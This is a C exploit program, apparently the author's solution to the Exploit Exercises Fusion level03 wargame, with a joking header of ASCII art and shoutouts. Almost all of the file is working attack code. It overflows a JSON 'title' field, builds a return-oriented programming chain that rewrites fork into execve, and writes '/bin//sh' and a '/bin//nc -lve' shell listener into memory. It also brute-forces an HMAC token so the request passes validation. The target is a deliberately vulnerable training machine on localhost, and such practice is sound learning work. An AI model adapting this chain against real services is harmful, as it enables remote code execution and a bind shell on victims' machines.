/* -----------------------------------------------------------------------
 * AUTHOR:     @jonatanhal
 * ABOUT:      Written when solving (exloit-exercises->fusion->level03), first
 *             time writing a exploit in C, it's a lot of fun! :D
 * DISCLAIMER: \x00;--
 * BUILD:      `gcc -o fusion_level03_solution fusion_level03_solution.c -lcrypto'
 * ----------------------------------------------------------------------
 * "Stop taking yourself so goddamn Cereal" - Yoshi Trump
 * ──────────────████──████────────────
 * ────────────██░░▒▒██░░▒▒██──────────
 * ──────────██░░──██────▒▒▓▓██────────
 * ──────────██████████████▓▓████████──
 * ──────────██──█ ──█ ──────██░░░░▒▒██
 * ──────██████──██──██────────████▒▒▓▓
 * ────██░░░░░░███████████░░░░░██████
 * ──██░░────░░░░▓▓░░▓▓▓▓▓▓░░──░░▒▒██░░   ________________________________________
 * ──████──██░░░░░░▒▒░░──────░░░░▒▒██▒▒  (                                        )
 * ██░░░░░░░░░░░░░░▒▒▒▒────────▒▒▓▓██▓▓ < You think this is a motherfucking game? )
 * ██░░░░░░░░░░░░▒▒▒▒▓▓────────▒▒▓▓████ (________________________________________)
 * ██▒▒░░░░░░▒▒▒▒▒▒▓▓██░░────░░▓▓▓▓████
 * ██▒▒▒▒▒▒▒▒▒▒▒▒▓▓▓▓████░░░░▓▓▓▓██▒▒██
 * ──██▒▒▒▒▒▒▓▓▓▓▓▓▓▓██──░░▓▓▓▓██████──
 * ────████▓▓▓▓▓▓▓▓██──░░▒▒▒▒▓▓██▒▒██──
 * ────────████████████▒▒▒▒▒▒▒▒▓▓██────
 * ────────██▒▒──▒▒██░░░░▒▒──────██────
 * ────████▒▒▒▒▒▒████░░░░██──────██────
 * ██████──██████──██░░░░████────██────
 * ██░░▒▒██──────████░░░░░░████──██────
 * ██──▓▓▒▒████████▒▒░░░░██░░████──────
 * ██────▓▓▒▒░░░░██▒▒░░────░░██████────
 * ──██░░────▒▒▒▒██▓▓▒▒░░░░░░██████────
 * ──██░░░░──────░░██▓▓▒▒░░████░░██────
 * ────████████████░░██████▒▒████──────
 * ────██▓▓▒▒░░░░██▒▒▒▒██████──────────
 * ────██▓▓▒▒░░░░██████░░██████────────
 * ──██▓▓▓▓▓▓▒▒──░░██▓▓▒▒░░░░──██──────
 * ──██▓▓▓▓▒▒░░░░░░██▓▓▓▓▒▒▒▒░░██──────
 * ──████████████████████████████──────﻿
 * 
 * /~~~~~~~~~~~ SHOUTOUTS ~~~~~~~~~~~~\
 * |  Stonestreet Crackers, jbogg     |
 * |  @malwaremustdie, detectify,     |
 * | Johnny@etiskhackare'15 for the   |
 * | tips on C-programming :D         |
 * \~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~/
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <openssl/hmac.h>
#include <err.h>

#define TARGET "127.0.0.1"
#define PORT 20003
#define TOKENSIZE 65
#define BUFFSIZE 8192
#define GARBAGE 0x61
#define PADDING 0xbeefbeef;

int crackHMAC(char *token, char *buffer, char *pointer);

int
main(int argc, char **argv)
{
	int sockfd, buflen, len, i;
	struct in_addr ipAddr;
	struct sockaddr_in targetAddr;
	unsigned char *buffer;
	unsigned char *pointer;
	unsigned char *token;
	
	// convert address to the proper type
	if (inet_aton(TARGET, &ipAddr) == -1)
		errx(1, "address conversion fail");

	// set up socket
	if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
		errx(1, "socket creation fail");

	// initialize the targetAddr structure
	targetAddr.sin_family = AF_INET;
	targetAddr.sin_port = htons(PORT);
	targetAddr.sin_addr = ipAddr;
	memset(&(targetAddr.sin_zero), '\0', 8);

	// Connect and the socket-stuff should be done.
	if (connect(sockfd, (struct sockaddr *)&targetAddr,
		    sizeof(struct sockaddr)) == -1)
		errx(1, "connection fail");

	// allocate some memory for token
	token = malloc(sizeof(unsigned char)*TOKENSIZE);
	if (token == NULL)
		errx(1, "token malloc fail");

	recv(sockfd, token, TOKENSIZE, 0);

	// adjust token to exclude leading and closing quotationmarks
	token++;
	memset(token+(strlen(token)-2), '\0', 1); // 60 == rindex(the-closing-quotationsmark);
	puts("- Received token"); 

	buffer = calloc(BUFFSIZE, sizeof(unsigned char));
	if (buffer == NULL)
		errx(1, "buffer calloc fail");

	pointer = buffer; // the door is a jar

	pointer += sprintf(pointer, "%s\n", token); // print token into the buffer
	pointer += sprintf(pointer, "%s", "{\"title\":\"");

	len=127;
	memset(pointer, 'A', len);
	pointer += len;

	// Whether we send one or twho backslashes is a matter of life
	// and death.
	// One backslash = peace, love and understanding.
	// Two backslashes = DESTRUCTION, CYBERWAR AND CHAOS.
	pointer += sprintf(pointer, "\\\\u%04hx", 0x4141);

	// Send some more padding to properly overflow
	len = 31;
	memset(pointer, 'B', len);
	pointer += len;

	// WARNING: UGLY CODE BELOW
	// *((int *)pointer) = 0x8049207; pointer += 4; // pop ebp; ret
	// *((int *)pointer) = 0x804a166; pointer += 4; // inc dword ptr [ebp + 0x16a7ec0]; ret
	
	*((int *)pointer) = 0x8049207; pointer += 4; // pop ebp; ret
	*((int *)pointer) = 0x804bd90 - 0x16a7ec0; pointer += 4; // fork@plt

	// &execve - &fork = 0x350
	for (i = 0; i < 0x350; i++) {
		// inc dword ptr [ebp + 0x16a7ec0]; ret
		*((int *)pointer) = 0x804a166; pointer += 4;
	}

	*((int *)pointer) = 0x8049b4f; pointer += 4; // pop eax; add esp, 0x5c; ret
	pointer += sprintf(pointer, "%s", "/bin");
	memset(pointer, GARBAGE+1, 0x5c); pointer += 0x5c;
	// Write /bin into memory A
	*((int *)pointer) = 0x8048bf0; pointer += 4; // pop ebx; ret
	*((int *)pointer) = 0x804be10 - 0x5d5b04c4; pointer += 4; // writable, zeroed memory
	*((int *)pointer) = 0x80493fe; pointer += 4; // add dword ptr [ebx + 0x5d5b04c4], eax; ret;
	// Write /bin into memory B
	*((int *)pointer) = 0x8048bf0; pointer += 4; // pop ebx; ret
	*((int *)pointer) = 0x804be19 - 0x5d5b04c4; pointer += 4; // writable, zeroed memory
	*((int *)pointer) = 0x80493fe; pointer += 4; // add dword ptr [ebx + 0x5d5b04c4], eax; ret;
	// load //sh into eax
	*((int *)pointer) = 0x8049b4f; pointer += 4; // pop eax; add esp, 0x5c; ret
	pointer += sprintf(pointer, "%s", "//sh");
	memset(pointer, GARBAGE+2, 0x5c); pointer += 0x5c;
	*((int *)pointer) = 0x8048bf0; pointer += 4; // pop ebx; ret
	*((int *)pointer) = 0x804be14 - 0x5d5b04c4; pointer += 4; // writable, zeroed memory
	*((int *)pointer) = 0x80493fe; pointer += 4; // add dword ptr [ebx + 0x5d5b04c4], eax; ret;
	// At this point, 0x804be10 should contain "/bin//sh"

	// Write /bin//nc into memory
	*((int *)pointer) = 0x8049b4f; pointer += 4; // pop eax; add esp, 0x5c; ret
	pointer += sprintf(pointer, "%s", "//nc");
	memset(pointer, GARBAGE+3, 0x5c); pointer += 0x5c;
	*((int *)pointer) = 0x8048bf0; pointer += 4; // pop ebx; ret
	*((int *)pointer) = 0x804be1d - 0x5d5b04c4; pointer += 4; // writeable, zeroed memory
	*((int *)pointer) = 0x80493fe; pointer += 4; // add dword ptr [ebx + 0x5d5b04c4], eax; ret;
	// At this point, 0x804be19 should contain "/bin//nc"

	// Write -le into memory
	*((int *)pointer) = 0x8049b4f; pointer += 4; // pop eax; add esp, 0x5c; ret
	pointer += sprintf(pointer, "%s", "-lve");
	memset(pointer, GARBAGE+4, 0x5c); pointer += 0x5c;
	*((int *)pointer) = 0x8048bf0; pointer += 4; // pop ebx; ret
	*((int *)pointer) = 0x804be25 - 0x5d5b04c4; pointer += 4; // writable, zeroed memory
	*((int *)pointer) = 0x80493fe; pointer += 4; // add dword ptr [ebx + 0x5d5b04c4], eax; ret;

	// Create argv
	*((int *)pointer) = 0x8049b4f; pointer += 4; // pop eax; add esp, 0x5c; ret
	*((int *)pointer) = 0x804be19; pointer += 4; // &"-le"
	memset(pointer, GARBAGE+5, 0x5c); pointer += 0x5c;
	*((int *)pointer) = 0x8048bf0; pointer += 4; // pop ebx; ret
	*((int *)pointer) = 0x804be30 - 0x5d5b04c4; pointer += 4; // writable, zeroed memory
	*((int *)pointer) = 0x80493fe; pointer += 4; // add dword ptr [ebx + 0x5d5b04c4], eax; ret;

	*((int *)pointer) = 0x8049b4f; pointer += 4; // pop eax; add esp, 0x5c; ret
	*((int *)pointer) = 0x804be25; pointer += 4; // &"-le"
	memset(pointer, GARBAGE+5, 0x5c); pointer += 0x5c;
	*((int *)pointer) = 0x8048bf0; pointer += 4; // pop ebx; ret
	*((int *)pointer) = 0x804be34 - 0x5d5b04c4; pointer += 4; // writable, zeroed memory
	*((int *)pointer) = 0x80493fe; pointer += 4; // add dword ptr [ebx + 0x5d5b04c4], eax; ret;

	*((int *)pointer) = 0x8049b4f; pointer += 4; // pop eax; add esp, 0x5c; ret
	*((int *)pointer) = 0x804be10; pointer += 4; // &"/bin//sh"
	memset(pointer, GARBAGE+6, 0x5c); pointer += 0x5c;
	*((int *)pointer) = 0x8048bf0; pointer += 4; // pop ebx; ret
	*((int *)pointer) = 0x804be38 - 0x5d5b04c4; pointer += 4; // writable, zeroed memory
	*((int *)pointer) = 0x80493fe; pointer += 4; // add dword ptr [ebx + 0x5d5b04c4], eax; ret;

	*((int *)pointer) = 0x8048f10; pointer += 4; // fork@plt
	*((int *)pointer) = PADDING; pointer += 4;
	*((int *)pointer) = 0x804be19; pointer += 4; // &"/bin//nc"
	*((int *)pointer) = 0x804be30; pointer += 4; // &argv

	// End of rop-chain
	pointer += sprintf(pointer, "%s", "\", \"contents\":\"nada\"");
	pointer += sprintf(pointer, "%s ", "}");

	puts("- Finding collision");
	pointer += crackHMAC(token, buffer, pointer);
	
	printf("- Buffer length: %d\n", (unsigned int) pointer - (unsigned int) buffer);

 	puts("- Sending buffer");
	if (send(sockfd, buffer, (unsigned int) pointer - (unsigned int) buffer, 0) == -1)
		errx(1, "Local error from send");

	puts("- FIN\n");
	close(sockfd);
	free(token-1); // Since we incremented the pointer, we need to
		       // appease the gods of malloc by passing a
		       // pointer that it recognizes. All hail mallocgods.
	free(buffer);

	return 0;
}

int
crackHMAC(char *token, char *buffer, char *pointer)
{
	// This loop is a copy of the validate_request function found @
	// https://exploit-exercises.com/fusion/level03/
	// This is running as long as (result[0] | result[1]) > 0.

	unsigned char result[20]; 
	int resultSize = sizeof(result);
	int len = 0;
	unsigned int incrementing = 0;

	while(1) {
		// Operator, please connect me to HMAC
		HMAC(EVP_sha1(),
		     token, strlen(token),
		     buffer, ((unsigned int)pointer - (unsigned int)buffer)+len,
		     result, &resultSize);

		// if invalid is zero, we've done it!
		if (result[0] | result[1]) {
			// modify buffer and repeat
			//printf("%02x%02x ", result[0], result[1]);
			len = sprintf(pointer, "\n//%d", incrementing);
			incrementing++;
			continue;
		} else {
       			printf("- Collision checksum: %02x%02x%02x%02x\n",
			       result[0], result[1], result[2], result[3]);
			return len;
		}
	}
}

